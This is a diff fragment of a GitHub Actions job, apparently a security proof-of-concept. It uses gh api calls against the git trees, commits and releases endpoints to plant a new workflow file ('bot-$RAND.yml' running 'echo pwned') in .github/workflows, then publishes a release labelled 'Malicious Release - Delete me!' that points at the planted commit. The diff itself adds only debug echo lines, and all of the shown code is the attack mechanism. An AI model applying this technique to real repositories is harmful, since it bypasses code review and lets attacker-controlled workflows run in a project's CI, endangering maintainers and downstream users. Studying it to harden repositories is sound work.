@@ -30,13 +30,21 @@ jobs:
                 - run: echo pwned'
           tree1(){ jq -nc --arg b "$1" --arg p "$2" --arg m "$3" --arg t "$4" --arg s "$5" '{base_tree:$b,tree:[{path:$p,mode:$m,type:$t,sha:$s}]}'; }
           BLOB=$(jq -nc --arg c "$YAML" '{content:$c,encoding:"utf-8"}' | gh api /repos/$REPO/git/blobs --input - --jq '.sha')
+          echo "One"
           NEWWF=$(tree1 "$WFTREE"    "bot-$RAND.yml" "100644" "blob" "$BLOB"  | gh api /repos/$REPO/git/trees --input - --jq '.sha')
+          echo "Two"
           NEWGH=$(tree1 "$DOTGH"     "workflows"     "040000" "tree" "$NEWWF" | gh api /repos/$REPO/git/trees --input - --jq '.sha')
+          echo "Three"
           NEWTOP=$(tree1 "$MAIN_TREE" ".github"      "040000" "tree" "$NEWGH" | gh api /repos/$REPO/git/trees --input - --jq '.sha')
+          echo "Four"
           SHA=$(jq -nc --arg t "$NEWTOP" --arg p "$MAIN_SHA" --arg m "bot-plant $RAND" '{tree:$t,parents:[$p],message:$m}' \
             | gh api /repos/$REPO/git/commits --input - --jq '.sha')
+          echo "Five"
           TAG="bot-$RAND"
+          echo "Six"
           RID=$(gh api /repos/$REPO/releases -f tag_name="$TAG" -f name="Malicious Release - Delete me!" -f target_commitish=main -F draft=true --jq '.id')
+          echo "Seven"
           gh api --method PATCH /repos/$REPO/releases/$RID -f target_commitish="$SHA" >/dev/null
+          echo "Eight"
           gh api --method PATCH /repos/$REPO/releases/$RID -F draft=false >/dev/null
           echo "PUBLISHED RID=$RID"
